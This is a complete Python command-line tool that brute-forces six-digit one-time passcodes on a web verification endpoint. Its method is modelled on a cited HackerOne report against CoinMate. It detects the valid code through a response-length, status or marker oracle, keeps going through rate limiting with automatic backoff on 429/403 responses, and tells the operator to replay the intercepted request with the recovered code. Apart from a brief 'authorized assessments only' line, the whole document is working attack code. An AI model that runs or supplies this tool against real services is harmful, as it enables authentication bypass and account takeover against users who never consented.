#!/usr/bin/env python3
"""
otp_bruteforce.py - OTP brute-force testing tool (authorized assessments only).

Methodology (HackerOne #3265780, CoinMate.io):
  1. Trigger an OTP challenge and intercept the verification request (Burp proxy).
  2. Brute-force the OTP candidate space (default 100000-999999).
  3. Detect the valid code via a response oracle - in the CoinMate case the
     valid response had a unique Content-Length of 961 bytes.
  4. Replay the ORIGINAL request with the recovered OTP to complete the action
     (e.g., the phone number is added to the profile).

Features:
  - Explicit oracles: --oracle-length / --oracle-status / --marker
  - Auto oracle: statistically identifies the outlier response bucket
  - Bounded concurrency with throttling backoff (429/403/network errors)
  - Candidate confirmation via N replays (single-use-code aware)
  - Burp proxy support for traffic visibility
  - --probe mode for baseline/oracle discovery

Stdlib only. Python 3.8+.

Examples:
  # Known oracle: valid responses are 961 bytes (the CoinMate signal)
  python3 otp_bruteforce.py --url https://target/api/verify-phone --method POST \
      --headers '{"Content-Type":"application/json","Cookie":"session=abc"}' \
      --body '{"phone":"+15551234567","otp":"{{OTP}}"}' \
      --oracle-length 961 --threads 10

  # No oracle known: auto-detect the outlier response
  python3 otp_bruteforce.py --url https://target/api/verify-phone --method POST \
      --headers '{"Content-Type":"application/json","Cookie":"session=abc"}' \
      --body '{"phone":"+15551234567","otp":"{{OTP}}"}' \
      --range 100000-999999 --threads 20 --delay 0.05

  # Baseline: inspect a single OTP's response (Phase 1 discovery)
  python3 otp_bruteforce.py --url https://target/api/verify-phone --method POST \
      --headers '{"Content-Type":"application/json"}' \
      --body '{"phone":"+15551234567","otp":"{{OTP}}"}' \
      --probe 123456

  # Route everything through Burp
  python3 otp_bruteforce.py ... --proxy http://127.0.0.1:8080
"""

from __future__ import annotations

import argparse
import itertools
import json
import random
import re
import sys
import threading
import time
import urllib.error
import urllib.request
from collections import Counter
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from dataclasses import dataclass
from typing import Optional

PLACEHOLDER = "{{OTP}}"
PROGRESS_EVERY = 500
MAX_NETWORK_ERRORS = 50


@dataclass
class ProbeResult:
    otp: str
    status: int
    length: int
    body: str = ""


@dataclass
class Oracle:
    """Decides whether a response signals a valid OTP."""
    length: Optional[int] = None
    status: Optional[int] = None
    marker: Optional[str] = None
    mode_status: int = 0   # auto mode: dominant (status, length) bucket
    mode_length: int = 0

    @property
    def auto(self) -> bool:
        return self.length is None and self.status is None and self.marker is None

    def matches(self, r: ProbeResult) -> bool:
        if self.length is not None:
            return r.length == self.length
        if self.status is not None:
            return r.status == self.status
        if self.marker is not None:
            return self.marker in r.body
        return (r.status, r.length) != (self.mode_status, self.mode_length)


def build_request(args, otp: str) -> urllib.request.Request:
    url = args.url.replace(PLACEHOLDER, otp)
    body = None
    if args.body:
        body = args.body.replace(PLACEHOLDER, otp).encode()
    headers = {}
    if args.headers:
        try:
            headers = json.loads(args.headers)
        except json.JSONDecodeError:
            sys.exit(f"[!] --headers is not valid JSON: {args.headers}")
    return urllib.request.Request(url, data=body, headers=headers, method=args.method)


def probe(args, otp: str) -> ProbeResult:
    req = build_request(args, otp)
    try:
        with urllib.request.urlopen(req, timeout=args.timeout) as resp:
            data = resp.read()
            return ProbeResult(otp, resp.status, len(data), data.decode(errors="replace"))
    except urllib.error.HTTPError as e:  # 4xx/5xx are still useful signals
        data = e.read()
        return ProbeResult(otp, e.code, len(data), data.decode(errors="replace"))
    except Exception:
        return ProbeResult(otp, 0, 0, "")


def parse_range(spec: str) -> list[str]:
    m = re.fullmatch(r"\s*(\d+)\s*-\s*(\d+)\s*", spec)
    if not m:
        sys.exit(f"[!] --range must look like '100000-999999', got: {spec!r}")
    lo, hi = int(m.group(1)), int(m.group(2))
    if lo > hi:
        lo, hi = hi, lo
    width = max(len(str(lo)), len(str(hi)))
    return [f"{n:0{width}d}" for n in range(lo, hi + 1)]


def run_probe(args) -> None:
    r = probe(args, args.probe)
    print(f"OTP={args.probe} status={r.status} length={r.length}")
    if r.body:
        print(r.body[:2000])
    sys.exit(0)


def main() -> None:
    ap = argparse.ArgumentParser(description="OTP brute-force tester (authorized testing only)")
    ap.add_argument("--url", required=True, help="Target URL; may contain {{OTP}}")
    ap.add_argument("--method", default="POST")
    ap.add_argument("--headers", help='JSON object, e.g. \'{"Cookie":"session=x"}\'')
    ap.add_argument("--body", help='Body with {{OTP}} placeholder, e.g. \'{"otp":"{{OTP}}"}\'')
    ap.add_argument("--range", default="100000-999999", help="Candidate range, e.g. 000000-999999")
    ap.add_argument("--threads", type=int, default=20, help="Concurrent workers")
    ap.add_argument("--delay", type=float, default=0.0, help="Min seconds between requests per worker")
    ap.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout")
    ap.add_argument("--oracle-length", type=int, help="Content-Length of a valid response (e.g. 961)")
    ap.add_argument("--oracle-status", type=int, help="HTTP status of a valid response")
    ap.add_argument("--marker", help="Substring present only in valid responses")
    ap.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
    ap.add_argument("--max-backoff", type=float, default=30.0, help="Max backoff seconds when throttled")
    ap.add_argument("--output", help="Write found OTP + matched response to a file")
    ap.add_argument("--confirm-trials", type=int, default=1,
                    help="Replays to confirm a candidate; use 1 for single-use codes (default)")
    ap.add_argument("--shuffle", action="store_true", help="Randomize candidate order")
    ap.add_argument("--probe", help="Send one OTP and print the response, then exit")
    args = ap.parse_args()

    if PLACEHOLDER not in (args.url + (args.body or "")):
        sys.exit(f"[!] {PLACEHOLDER} placeholder must appear in --url or --body")

    if args.proxy:
        urllib.request.install_opener(
            urllib.request.build_opener(
                urllib.request.ProxyHandler({"http": args.proxy, "https": args.proxy})
            )
        )

    if args.probe:
        run_probe(args)

    candidates = parse_range(args.range)
    if args.shuffle:
        random.shuffle(candidates)

    oracle = Oracle(length=args.oracle_length, status=args.oracle_status, marker=args.marker)
    stats = {"sent": 0, "errors": 0, "throttled": 0}
    buckets: Counter = Counter()  # (status, length) -> count
    lock = threading.Lock()
    stop = threading.Event()
    baseline_ready = threading.Event()
    winner: Optional[ProbeResult] = None
    start = time.monotonic()

    def record(r: ProbeResult) -> None:
        with lock:
            stats["sent"] += 1
            buckets[(r.status, r.length)] += 1
            n = stats["sent"]
        if n % PROGRESS_EVERY == 0:
            elapsed = time.monotonic() - start
            print(f"[*] {n}/{len(candidates)} sent ({n / elapsed:.0f}/s) "
                  f"errs={stats['errors']} throttled={stats['throttled']}", flush=True)

    def set_baseline() -> None:
        """Auto mode: learn the dominant response bucket after a stable sample."""
        if baseline_ready.is_set():
            return
        with lock:
            if stats["sent"] >= 50 and buckets:
                (s, l), c = buckets.most_common(1)[0]
                if c >= 10:
                    oracle.mode_status, oracle.mode_length = s, l
                    baseline_ready.set()

    def worker(otp: str) -> Optional[ProbeResult]:
        backoff_s = 0.5
        for _ in range(8):  # retry/backoff loop per candidate
            if stop.is_set():
                return None
            if args.delay:
                time.sleep(args.delay)
            r = probe(args, otp)
            if r.status not in (429, 403) and r.status != 0:
                record(r)
                return r
            with lock:
                if r.status in (429, 403):
                    stats["throttled"] += 1
                else:
                    stats["errors"] += 1
                    if stats["errors"] >= MAX_NETWORK_ERRORS:
                        print(f"[!] Aborting: {stats['errors']} network errors", flush=True)
                        stop.set()
                        return None
            time.sleep(min(backoff_s, args.max_backoff))
            backoff_s = min(backoff_s * 2, args.max_backoff)
        return None

    def confirm(otp: str) -> bool:
        """Replay the OTP; every trial must reproduce the oracle signal."""
        trials = max(1, args.confirm_trials)
        hits = 0
        for _ in range(trials):
            if stop.is_set():
                return False
            r = probe(args, otp)
            if r.length > 0 and oracle.matches(r):
                hits += 1
        return hits == trials

    print(f"[*] Candidates: {len(candidates)} over {args.range}")
    print(f"[*] Oracle: " + ("auto-detect (outlier bucket)" if oracle.auto else
                             f"length={oracle.length} status={oracle.status} marker={oracle.marker!r}"))

    pool = ThreadPoolExecutor(max_workers=args.threads)
    pending = {}
    window = max(args.threads * 8, 64)  # bounded submission window
    cand_iter = iter(candidates)

    def fill() -> None:
        while len(pending) < window:
            try:
                c = next(cand_iter)
            except StopIteration:
                break
            pending[pool.submit(worker, c)] = c

    fill()
    try:
        while pending and not stop.is_set():
            done, _ = wait(pending, return_when=FIRST_COMPLETED)
            for fut in done:
                del pending[fut]
                if stop.is_set():
                    break
                r = fut.result()
                if r is None:
                    continue
                if oracle.auto:
                    set_baseline()
                if (not oracle.auto or baseline_ready.is_set()) and oracle.matches(r) and r.length > 0:
                    if confirm(r.otp):
                        winner = r
                        print(f"\n[+] VALID OTP FOUND: {r.otp} "
                              f"(status={r.status}, length={r.length})", flush=True)
                        if args.output:
                            with open(args.output, "w") as f:
                                f.write(f"OTP: {r.otp}\nstatus: {r.status}\n"
                                        f"length: {r.length}\n\n{r.body}")
                        stop.set()
                        break
                    else:
                        with lock:
                            stats["errors"] += 1  # false positive; keep scanning
            if not stop.is_set():
                fill()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.", flush=True)
    finally:
        if sys.version_info >= (3, 9):
            pool.shutdown(wait=False, cancel_futures=True)
        else:
            pool.shutdown(wait=False)

    elapsed = time.monotonic() - start
    rate = stats["sent"] / elapsed if elapsed else 0.0
    print(f"\n[*] Done: {stats['sent']} requests in {elapsed:.1f}s ({rate:.0f}/s), "
          f"throttled={stats['throttled']}")

    if winner:
        print(f"\n[!] Replay the ORIGINAL intercepted request with OTP = {winner.otp}")
        print("    to complete the action (e.g., phone number added to profile).")
        if args.output:
            print(f"    Matched response saved to: {args.output}")
    else:
        print("\n[-] No valid OTP found within the tested range.")
        print("    Most common response buckets (status, length -> count):")
        for (s, l), c in buckets.most_common(8):
            print(f"      status={s} length={l} -> {c}")
        if oracle.auto:
            print("    Tip: if a rare bucket matches a hand-verified valid response,")
            print("    rerun with --oracle-length or --marker.")


if __name__ == "__main__":
    main()